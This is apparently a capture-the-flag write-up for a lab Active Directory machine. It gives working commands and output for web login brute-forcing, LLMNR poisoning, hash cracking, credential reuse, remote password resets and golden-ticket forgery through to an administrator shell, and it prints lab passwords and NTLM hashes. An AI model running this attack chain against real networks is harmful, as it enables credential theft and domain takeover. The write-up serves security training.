# DC04

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.75:53
Open 10.0.2.75:80
Open 10.0.2.75:88
Open 10.0.2.75:135
Open 10.0.2.75:139
Open 10.0.2.75:389
Open 10.0.2.75:445
Open 10.0.2.75:464
Open 10.0.2.75:593
Open 10.0.2.75:3268
Open 10.0.2.75:5985
Open 10.0.2.75:9389
Open 10.0.2.75:49664
Open 10.0.2.75:49668
Open 10.0.2.75:49680
Open 10.0.2.75:49712
Open 10.0.2.75:55658
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.75

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://soupedecode.local
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-10-04 20:46:43Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49680/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
55658/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 11h59m57s
| smb2-time: 
|   date: 2025-10-04T20:47:31
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60344/tcp): CLEAN (Timeout)
|   Check 2 (port 29043/tcp): CLEAN (Timeout)
|   Check 3 (port 55012/udp): CLEAN (Timeout)
|   Check 4 (port 37494/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:bc:2f:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   DC01<00>             Flags: <unique><active>
|   SOUPEDECODE<00>      Flags: <group><active>
|   SOUPEDECODE<1c>      Flags: <group><active>
|   SOUPEDECODE<1b>      Flags: <unique><active>
|   DC01<20>             Flags: <unique><active>
| Statistics:
|   08:00:27:bc:2f:81:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
```
:::

::: details enum4linux-ng.log
```bash
â””â”€$ enum4linux-ng 10.0.2.75
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.0.2.75
[*] Username ......... ''
[*] Random Username .. 'woeemshl'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ==================================
|    Listener Scan on 10.0.2.75    |
 ==================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =================================================
|    Domain Information via LDAP for 10.0.2.75    |
 =================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: SOUPEDECODE.LOCAL

 ========================================================
|    NetBIOS Names and Workgroup/Domain for 10.0.2.75    |
 ========================================================
[+] Got domain/workgroup name: SOUPEDECODE
[+] Full NetBIOS names information:
- DC01            <00> -         B <ACTIVE>  Workstation Service
- SOUPEDECODE     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- SOUPEDECODE     <1c> - <GROUP> B <ACTIVE>  Domain Controllers
- SOUPEDECODE     <1b> -         B <ACTIVE>  Domain Master Browser
- DC01            <20> -         B <ACTIVE>  File Server Service
- MAC Address = 08-00-27-BC-2F-81

 ======================================
|    SMB Dialect Check on 10.0.2.75    |
 ======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ========================================================
|    Domain Information via SMB session for 10.0.2.75    |
 ========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: SOUPEDECODE
DNS domain: SOUPEDECODE.LOCAL
FQDN: DC01.SOUPEDECODE.LOCAL
Derived membership: domain member
Derived domain: SOUPEDECODE

 ======================================
|    RPC Session Check on 10.0.2.75    |
 ======================================
[*] Check for null session
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE
[-] Sessions failed, neither null nor user sessions were possible

 ============================================
|    OS Information via RPC for 10.0.2.75    |
 ============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 1.01 seconds
```
:::

## HTTP (80)

The main website doesn't serve content
```bash
â””â”€$ curl 10.0.2.75 -L
curl: (47) Maximum (50) redirects followed
```

```bash
â””â”€$ feroxbuster -u http://soupedecode.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 276,308
302      GET        0l        0w        0c http://soupedecode.local/ => http://soupedecode.local
403      GET        9l       30w      308c http://soupedecode.local/webalizer
302      GET        0l        0w        0c http://soupedecode.local/index.php => http://soupedecode.local
403      GET        9l       30w      308c http://soupedecode.local/phpmyadmin
503      GET       11l       44w      408c http://soupedecode.local/examples
301      GET        9l       30w      356c http://soupedecode.local/licenses => http://soupedecode.local:8080/licenses/
200      GET      470l     1023w    29097c http://soupedecode.local/server-status
200      GET     1169l     7264w   102074c http://soupedecode.local/server-info
[####################] - 34s    27106/27106   0s      found:55      errors:0
[####################] - 34s    26996/26996   799/s   http://soupedecode.local/ 
```

```bash
â””â”€$ curl http://soupedecode.local/server-info -s | grep soupedecode.local
<dt><strong>Hostname/port:</strong> <tt>soupedecode.local:8080</tt></dt>
<dd><tt>&nbsp;&nbsp;56:&nbsp;&nbsp;&nbsp;ServerName <i>heartbeat.soupedecode.local</i></tt></dd>
<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 Server at soupedecode.local Port 8080</address>
```

### Heartbeat

![writeup.png](/assets/pentest/hackmyvm/dc04/writeup.png)

```bash
â””â”€$ feroxbuster -u http://heartbeat.soupedecode.local/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 276,316
200      GET        0l        0w        0c http://heartbeat.soupedecode.local/
200      GET        0l        0w        0c http://heartbeat.soupedecode.local/Index.php
403      GET       65l      130w     1822c http://heartbeat.soupedecode.local/Login.php
403      GET       59l      116w     1578c http://heartbeat.soupedecode.local/app.php
200      GET        0l        0w        0c http://heartbeat.soupedecode.local/index.php
301      GET        9l       30w      369c http://heartbeat.soupedecode.local/licenses => http://heartbeat.soupedecode.local/licenses/
403      GET       65l      130w     1822c http://heartbeat.soupedecode.local/login.php
503      GET       11l       44w      416c http://heartbeat.soupedecode.local/examples
200      GET      498l     1070w    32732c http://heartbeat.soupedecode.local/server-status
200      GET     1169l     7264w   102090c http://heartbeat.soupedecode.local/server-info
[####################] - 6s      4806/4806    0s      found:10      errors:0
[####################] - 5s      4732/4732    877/s   http://heartbeat.soupedecode.local/ 
```

We might need to bruteforce the password..

Hmmmmm... curl doesn't show the error response, html gets cut off by PHP ðŸ¤”
```bash
â””â”€$ curl 'http://heartbeat.soupedecode.local/login.php' -d 'username=x&password=x' -s | grep Invalid

â””â”€$ curl http://heartbeat.soupedecode.local/login.php
<div class="container">
    <h2>Login</h2>
    <form method="post" action="">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <input type="submit" value="Login">
    </form>
```

Had to reimport bijilion times because the app kept crashing and if it crashed the app was dead forever, no restart saved it...

Also weird flex or just low memory for VM, if some header was not present PHP just didn't do anything???
```python
from requests import Session

URL = 'http://heartbeat.soupedecode.local/login.php'
HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
}
WORDLIST = '/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt'
USERNAME = 'admin'

with open(WORDLIST) as passwords, Session() as session:
    for i, password in enumerate(passwords, start=1):
        password = password.strip()
        data = { "username": USERNAME, "password": password }
        resp = session.post(URL, data=data, headers=HEADERS)
        print(f'Trying: [{i}] {password}{" "*20}', end='\r', flush=True)
        if 'Invalid username or password.' not in resp.text and '</body' in resp.text:
            print(f'Success: {password}{" "*20}')
            break
```

```bash
â””â”€$ py brute.py
Success: nimda
```

::: tip Creds
`admin:nimda`
:::

### LLMNR Poisoning

![writeup-1.png](/assets/pentest/hackmyvm/dc04/writeup-1.png)

```bash
â””â”€$ sudo responder -I eth0
[SMB] NTLMv2-SSP Client   : 10.0.2.77
[SMB] NTLMv2-SSP Username : soupedecode\websvc
[SMB] NTLMv2-SSP Hash     : websvc::soupedecode:0bfe2701cdc98ef5:37493415D5871635A1A6C742FA5D70E6:0101000000000000809D2BF0FE34DC01B7D3D504A8FC6A3600000000020008004300350059004F0001001E00570049004E002D005900450047004100320041003000450041003200390004003400570049004E002D00590045004700410032004100300045004100320039002E004300350059004F002E004C004F00430041004C00030014004300350059004F002E004C004F00430041004C00050014004300350059004F002E004C004F00430041004C0007000800809D2BF0FE34DC01060004000200000008003000300000000000000000000000004000004FF0A1DECD70F32444D77DBFC36219AD63EC9FC83744E19B369B098D29ACC07A0A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0030002E0032002E00310035000000000000000000
```

```powershell
âžœ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
jordan23         (websvc)
```

::: tip Creds
`websvc:jordan23`
:::

## SMB

`STATUS_PASSWORD_EXPIRED` is a bug, login to VM manually and set new password.
```bash
â””â”€$ netexec smb soupedecode.local -u 'websvc' -p 'jordan23' --shares
SMB         10.0.2.77       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.77       445    DC01             [-] SOUPEDECODE.LOCAL\websvc:jordan23 STATUS_PASSWORD_EXPIRED
```

```bash
â””â”€$ netexec smb soupedecode.local -u 'websvc' -p 'Password123$' --shares
SMB         10.0.2.77       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.77       445    DC01             [+] SOUPEDECODE.LOCAL\websvc:Password123$
SMB         10.0.2.77       445    DC01             [*] Enumerated shares
SMB         10.0.2.77       445    DC01             Share           Permissions     Remark
SMB         10.0.2.77       445    DC01             -----           -----------     ------
SMB         10.0.2.77       445    DC01             ADMIN$                          Remote Admin
SMB         10.0.2.77       445    DC01             C               READ
SMB         10.0.2.77       445    DC01             C$                              Default share
SMB         10.0.2.77       445    DC01             IPC$            READ            Remote IPC
SMB         10.0.2.77       445    DC01             NETLOGON        READ            Logon server share
SMB         10.0.2.77       445    DC01             SYSVOL          READ            Logon server share
```

```bash
â””â”€$ impacket-smbclient 'soupedecode.local'/'websvc':'Password123$'@'soupedecode.local'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use C
# ls
drw-rw-rw-          0  Sat Jun 15 15:19:51 2024 $WinREAgent
drw-rw-rw-          0  Sat Jun 15 22:51:08 2024 Documents and Settings
-rw-rw-rw-      12288  Sat Oct  4 19:12:00 2025 DumpStack.log.tmp
-rw-rw-rw- 1476395008  Sat Oct  4 19:12:00 2025 pagefile.sys
drw-rw-rw-          0  Sat Jun 15 23:48:59 2024 PerfLogs
drw-rw-rw-          0  Sat Jun 15 13:54:31 2024 Program Files
drw-rw-rw-          0  Sat Jun 15 23:49:00 2024 Program Files (x86)
drw-rw-rw-          0  Tue Nov  5 16:44:31 2024 ProgramData
drw-rw-rw-          0  Sat Jun 15 22:51:08 2024 Recovery
drw-rw-rw-          0  Sat Jun 15 15:02:21 2024 System Volume Information
drw-rw-rw-          0  Wed Nov  6 20:55:53 2024 Users
drw-rw-rw-          0  Thu Nov  7 17:32:13 2024 Windows
drw-rw-rw-          0  Tue Nov  5 17:56:28 2024 xampp
# cd /Users
# ls
drw-rw-rw-          0  Wed Nov  6 20:55:53 2024 .
drw-rw-rw-          0  Tue Nov  5 18:30:29 2024 ..
drw-rw-rw-          0  Sat Jun 15 15:56:40 2024 Administrator
drw-rw-rw-          0  Sat Jun 15 23:49:29 2024 All Users
drw-rw-rw-          0  Sat Jun 15 22:51:08 2024 Default
drw-rw-rw-          0  Sat Jun 15 23:49:29 2024 Default User
-rw-rw-rw-        174  Sat Jun 15 23:46:32 2024 desktop.ini
drw-rw-rw-          0  Wed Nov  6 20:55:53 2024 fjudy998
drw-rw-rw-          0  Wed Nov  6 20:55:40 2024 ojake987
drw-rw-rw-          0  Sat Jun 15 13:54:32 2024 Public
drw-rw-rw-          0  Wed Nov  6 20:54:39 2024 rtina979
drw-rw-rw-          0  Wed Nov  6 20:44:11 2024 websvc
drw-rw-rw-          0  Wed Nov  6 20:55:47 2024 xursula991
```

### User.txt

```bash
# cat websvc/Desktop/user.txt
709e449a996a85aa7deaf18c79515d6a
```

## Lateral Movement

```bash
â””â”€$ ldapdomaindump -u 'SOUPEDCODE\websvc' -p 'Password123$' --no-json --no-grep dc01.soupedecode.local
```

![writeup-2.png](/assets/pentest/hackmyvm/dc04/writeup-2.png)

::: tip Creds
`rtina979:Z~l3JhcV#7Q-1#M`
:::

```bash
â””â”€$ netexec smb soupedecode.local -u 'rtina979' -p 'Z~l3JhcV#7Q-1#M' --shares
SMB         10.0.2.77       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.77       445    DC01             [-] SOUPEDECODE.LOCAL\rtina979:Z~l3JhcV#7Q-1#M STATUS_PASSWORD_EXPIRED
```

On `websvc` user I tried resetting password to same thing, that was my mistake. No need to login to VM, you can reset password remotely as long as it satisfies password policy of DC.
```bash
â””â”€$ netexec smb soupedecode.local -u 'rtina979' -p 'Z~l3JhcV#7Q-1#M' -M change-password -o NEWPASS='Password123$'
SMB         10.0.2.77       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.77       445    DC01             [-] SOUPEDECODE.LOCAL\rtina979:Z~l3JhcV#7Q-1#M STATUS_PASSWORD_EXPIRED
CHANGE-P... 10.0.2.77       445    DC01             [+] Successfully changed password for rtina979

â””â”€$ netexec smb soupedecode.local -u 'rtina979' -p 'Password123$'
SMB         10.0.2.77       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.77       445    DC01             [+] SOUPEDECODE.LOCAL\rtina979:Password123$
```

### Report

```bash
â””â”€$ impacket-smbclient 'soupedecode.local'/'rtina979':'Password123$'@'soupedecode.local'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use C
# cd /Users/rtina979
# tree
...
/Users/rtina979/Documents/Report.rar
...
Finished - 93 files and folders
# get /Users/rtina979/Documents/Report.rar
```

```bash
â””â”€$ 7z x Report.rar
Enter password (will not be echoed): 
```

```bash
â””â”€$ rar2john Report.rar | tee Report.rar.hash
Report.rar:$rar5$16$7b74f4c32feb807c16edc906c283e524$15$872f8d1a914bd1503dac110c7bbb938a$8$3e15430028d503b5
```

```powershell
âžœ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
PASSWORD123      (Report.rar)
```

```bash
â””â”€$ unrar x Report.rar
Enter password (will not be echoed) for Report.rar: PASSWORD123
Extracting from Report.rar

Extracting  Pentest Report.htm                                        OK
Creating    Pentest Report_files                                      OK
Extracting  Pentest Report_files/m2-unbound-source-serif-pro.css      OK
Extracting  Pentest Report_files/main-branding-base.W9J-2zkF03j8TkriAGn1Tg.12.css  OK
Extracting  Pentest Report_files/dart.min.js                          OK
Extracting  Pentest Report_files/google-analytics_analytics.js        OK
Extracting  Pentest Report_files/highlight.min.js                     OK
Extracting  Pentest Report_files/main-base.bundle.IcW7tD43-xaHoBj2_P6wLQ.12.js  OK
Extracting  Pentest Report_files/main-common-async.bundle.SkTeOM8g4JVEInYAgrgW9Q.12.js  OK
Extracting  Pentest Report_files/main-notes.bundle.qVLVB-ghGjYQMo6npDHNjw.12.js  OK
Extracting  Pentest Report_files/main-posters.bundle.JMIo8YhZ0NhbVObiML4nWQ.12.js  OK
All OK
```

![writeup-3.png](/assets/pentest/hackmyvm/dc04/writeup-3.png)

Seems like a chunk of hash
```bash
file_svc:$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$afade2a48795f1f
```

Password is in summary

![writeup-4.png](/assets/pentest/hackmyvm/dc04/writeup-4.png)

No login
```bash
â””â”€$ netexec smb soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
SMB         10.0.2.77       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.77       445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:Password123!! STATUS_LOGON_FAILURE
```

At the end there's also NTDIST dump
```bash
â””â”€$ nano ntdist_dump.txt
krbtgt:0f55cdc40bd8f5814587f7e6b2f85e6f
bmark0:d72c66e955a6dc0fe5e76d205a630b15
otara1:ee98f16e3d56881411fbd2a67a5494c6
kleo2:bda63615bc51724865a0cd0b4fd9ec14
eyara3:68e34c259878fd6a31c85cbea32ac671
pquinn4:92cdedd79a2fe7cbc8c55826b0ff2d54
jharper5:800f9c9d3e4654d9bd590fc4296adf01
bxenia6:d997d3309bc876f12cbbe932d82b18a3
gmona7:c2506dfa7572da51f9f25b603da874d4
oaaron8:869e9033466cb9f7f8d0ce5a5c3305c6
pleo9:54a3a0c87893e1051e6f7b629ca144ef
evictor10:c918a6413865d3701a40071365fa1c3e
wreed11:a581adbf0e50ba5e4b4c4d95ca190471
bgavin12:ba78418ef53add0841b76f103e487bf5
ndelia13:341b52ef9e84306e4efbbf275428640e
akevin14:cf31e20946a86113fef93a640d8dc64e
kxenia15:a34ebec647265a56cfd0b45b45b60922
ycody16:e50f0a735af2069ed26c13b1ad7df962
qnora17:89237fedf5fb31cdd847a88e33b4d09b
dyvonne18:9f72bb25fa1d246fa8cfbd243bdd51fb
qxenia19:a1535954f1808f130fee8b2c8f02a692
rreed20:aac6265594fead59fa15d377bbbb2dcb
icody21:b19f543d19fa53cc96c319c68e7c25a5
ftom22:f10af34344849008dfdca5481c699073
ijake23:801f7dab7e0d2381e2579a0d38ba7b66
rpenny24:5fab1372261215c4b044a87783431864
jiris25:aa6012bfc74a0369d29156021f3257bc
colivia26:8f5f5bb40aff00e15459b391f7921b75
pyvonne27:b6fd3ed6bb8d9e663ea1c94d7b389742
zfrank28:047bd6340fd9ba02f528fdd53f3ef75d
ybob317:6c1bb84837a6e5f236a14e7ee738bcb2
file_svc:2806705edcad95cdbcae8c0b579e77bd
qethan32:88a4ff75882e901d5297177e77b283ef
khenry33:5b54e2ed8cb45535eeed141497b4c4ad
sjudy34:9c31a3819c17a301ee81fe6153736fe3
rrachel35:2cdca6302c467b2e6e20ed6569b4ec05
caiden36:fdd90e58478ff95f06e0ec63d843966c
xbella37:cf73af1266f43400736bb947a39d5c2d
smark38:c259b454d173d109570f548bc4c80586
zximena448:09f26c79361eb03865275f61f0d60336
fmike40:48e0d7983f09b77aebd1ad4bbd5854b5
yeli41:47396dcddefeeb7941f2da82c80b08fc
knina42:a3fd7598c3b7d31392c9dab7974b17bf
vhelen43:0bb00e50f5b5543c96fc44de85574dc9
xoliver44:8040440a5a5cc24d8396ddfaeca5449b
jxander45:5b0891170d505561fc1d5e15324eebe3
czane46:c359110d940bafdabb4fbaafd939c04f
rwendy47:aa5997bbd9979fa1bfe36a0b71a60492
usean48:bf62b617cecc972f9dd14658ad39ff11
fhenry49:3ad857fdec198942ffc7515dcc832a9c
xkaren50:985711636a0b82d29fc11128d73d0cae
rbianca51:8ba444ab206cecbab4ed60b67c97efaa
mmona52:7cbb29015e4b6b0dbc3c03306a34951a
znora53:b5155ab1d24cfa4933c163fd847c2f04
zlila54:963305aaddd33d7f5794673a6abef94f
lliam55:6161f5e4e1eeabf6495fa94b20452ea8
znathan56:1a283daf0aae0b222dd99424583fd95e
kbella57:2fe66343f4b6e3a44dfc3fa970555a32
malice58:eeae0838405421f1e5387735e417f238
gadam59:be04e40e37d84cb655d39d944edff55d
byara60:3144195749475777ac877bf26160a1f2
fpenny61:2e936cf39faac7bd327d1fc4a923991b
tmona62:3d598e1b62ee28c4716d732c5a18a491
iuma63:c072a0fbdf9c330cb0362af964c5dea5
voscar64:7e599f533c36f5296aa6f714f89049b6
mpeter65:e7f4f860fd1ff873e2aed8ad0bce8d43
suna66:12a993f319ed123858bf78eb0e6dad87
bmegan67:7c697424104788b1ee289137f3432dd8
vsteve68:3280107c4a792f6adcb97876a3cb5f91
zcolin69:51c1adf50b3dd20dfed667e966af5091
wzane70:e278b99f3b9defc89092d86930cb7ad4
poscar71:489e964541ee04127e53dbea4a1807cd
walice72:57e9d64fd4bc187a18b2c62e2c6b0121
gvera73:d88e17ab0f79fed61e29f601a5d5efa0
khenry74:ed3c1f1b21ecd8fc1b034ce9e58d553b
otom75:2c16a2918e02eebb7fb3bac6be1d157a
hyusuf76:c6014e8ec0b66cb67bb07e08da725c06
xyara77:84a8b0d70714d5e9be2bd8d020c4562c
aian78:a29ea7347e2037278c08073de4334e90
xkate578:96ea865cda874db10d1b7c333e0d014a
ctina80:a2e4a0ae3dd15b118c8a210be20365e0
xrose81:ce4353626ad1fe9f76b1f5a1681d51aa
xharper82:008cd6d501431735075d448ff9c42704

â””â”€$ awk -F':' '{print $1}' ./ntdist_dump.txt > u
â””â”€$ awk -F':' '{print $2}' ./ntdist_dump.txt > p
â””â”€$ netexec smb soupedecode.local -u ./u -H ./p --continue-on-success --no-bruteforce
SMB         10.0.2.77       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.77       445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:0f55cdc40bd8f5814587f7e6b2f85e6f STATUS_ACCOUNT_DISABLED
SMB         10.0.2.77       445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:d72c66e955a6dc0fe5e76d205a630b15 STATUS_PASSWORD_EXPIRED
SMB         10.0.2.77       445    DC01             [-] SOUPEDECODE.LOCAL\otara1:ee98f16e3d56881411fbd2a67a5494c6 STATUS_PASSWORD_EXPIRED
...
# All STATUS_PASSWORD_EXPIRED
```

### Golden Tickets

Kerberos service account is disabled for authentication, however it exists and can be used for something else: [https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden#golden-tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden#golden-tickets)

```bash
â””â”€$ netexec ldap soupedecode.local -u 'rtina979' -p 'Password123$' --get-sid
LDAP        10.0.2.77       389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.0.2.77       389    DC01             [+] SOUPEDECODE.LOCAL\rtina979:Password123$
LDAP        10.0.2.77       389    DC01             Domain SID S-1-5-21-2986980474-46765180-2505414164
```

Get ticket
```bash
â””â”€$ impacket-ticketer -nthash "0f55cdc40bd8f5814587f7e6b2f85e6f" -domain-sid "S-1-5-21-2986980474-46765180-2505414164" -domain "soupedecode.local" "Administrator"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for soupedecode.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache

â””â”€$ export KRB5CCNAME=Administrator.ccache
```

Ticket is valid
```bash
â””â”€$ sudo ntpdate soupedecode.local
2025-10-09 01:48:19.132680 (-0400) +39598.289064 +/- 0.000373 soupedecode.local 10.0.2.77 s1 no-leap
CLOCK: time stepped by 39598.289064

â””â”€$ printf "%.0f\n" $(( 39598.289064 / 60 / 60 ))
11

â””â”€$ faketime -f +11h netexec smb soupedecode.local -u 'Administrator' --use-kcache
SMB         soupedecode.local 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         soupedecode.local 445    DC01             [+] SOUPEDECODE.LOCAL\Administrator from ccache (Pwn3d!)
```

### WinRM

Configure Kerberos authentication
```bash
â””â”€$ netexec smb soupedecode.local -u 'rtina979' -p 'Password123$' --generate-krb5-file dc04.conf
SMB         10.0.2.77       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.77       445    DC01             [+] SOUPEDECODE.LOCAL\rtina979:Password123$

â””â”€$ cat dc04.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = SOUPEDECODE.LOCAL

[realms]
    SOUPEDECODE.LOCAL = {
        kdc = dc01.SOUPEDECODE.LOCAL
        admin_server = dc01.SOUPEDECODE.LOCAL
        default_domain = SOUPEDECODE.LOCAL
    }

[domain_realm]
    .SOUPEDECODE.LOCAL = SOUPEDECODE.LOCAL
    SOUPEDECODE.LOCAL = SOUPEDECODE.LOCAL

â””â”€$ export KRB5_CONFIG=dc04.conf
```

```bash
â””â”€$ faketime -f +11h evil-winrm-py -i soupedecode.local -k --no-pass
[*] Connecting to 'soupedecode.local:5985' as 'Administrator@SOUPEDECODE.LOCAL'
[-] Processing security token
[-] SpnegoError (4294967295): Major (851968): Unspecified GSS failure.  Minor code may provide more information, Minor (2529638919): Server not found in Kerberos database, Context: Processing security token

â””â”€$ faketime -f +11h evil-winrm-py -i dc01.soupedecode.local -k --no-pass
[*] Connecting to 'dc01.soupedecode.local:5985' as 'Administrator@SOUPEDECODE.LOCAL'
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
soupedecode.local\administrator
```

### Root.txt

```powershell
evil-winrm-py PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
1c66eabe105636d7e0b82ec1fa87cb7a
```